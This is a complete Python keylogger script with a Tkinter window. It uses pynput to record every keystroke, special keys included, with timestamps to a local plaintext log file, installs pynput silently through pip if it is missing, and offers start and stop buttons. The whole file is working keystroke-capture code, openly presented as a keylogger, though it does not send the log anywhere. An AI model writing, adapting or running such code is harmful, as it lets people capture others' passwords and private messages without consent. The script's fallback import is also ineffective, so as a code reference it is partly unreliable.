import subprocess
import sys
import logging
from datetime import datetime
import tkinter as tk
from tkinter import messagebox
from threading import Thread
from pynput import keyboard

# Function to install the necessary package
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Try to import `pynput`, install if not available
try:
    from pynput import keyboard
except ImportError:
    install('pynput')
    from pynput import keyboard

# Configure logging to write to a file, including timestamps
log_file = "advanced_keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to handle key press events
def on_press(key):
    try:
        # Log the character of the key pressed
        logging.info(f'{key.char}')
    except AttributeError:
        # Log special keys (non-character keys)
        logging.info(f'[{key}]')

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener when 'Escape' key is pressed
        return False

# Main function to start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Function to run the keylogger in a separate thread
def run_keylogger():
    global keylogger_thread
    keylogger_thread = Thread(target=start_keylogger)
    keylogger_thread.start()

# Function to stop the keylogger
def stop_keylogger():
    global keylogger_thread
    # Stop the keylogger thread
    if keylogger_thread.is_alive():
        # Use the escape key to stop the keylogger
        keyboard.Controller().press(keyboard.Key.esc)
        keyboard.Controller().release(keyboard.Key.esc)
        keylogger_thread.join()
        messagebox.showinfo("Info", "Keylogger stopped.")
    else:
        messagebox.showinfo("Info", "Keylogger is not running.")

# Function to start the keylogger from the GUI
def start_keylogger_gui():
    messagebox.showinfo("Info", "Keylogger started. Press 'Escape' to stop.")
    run_keylogger()

# Create the main GUI window
root = tk.Tk()
root.title("Keylogger GUI")

# Create and place the start button
start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger_gui)
start_button.pack(pady=10)

# Create and place the stop button
stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=10)

# Start the GUI event loop
root.mainloop()

# Entry point of the script
if __name__ == "__main__":
    print(f"Keylogger is running... (Press 'Escape' to stop)")
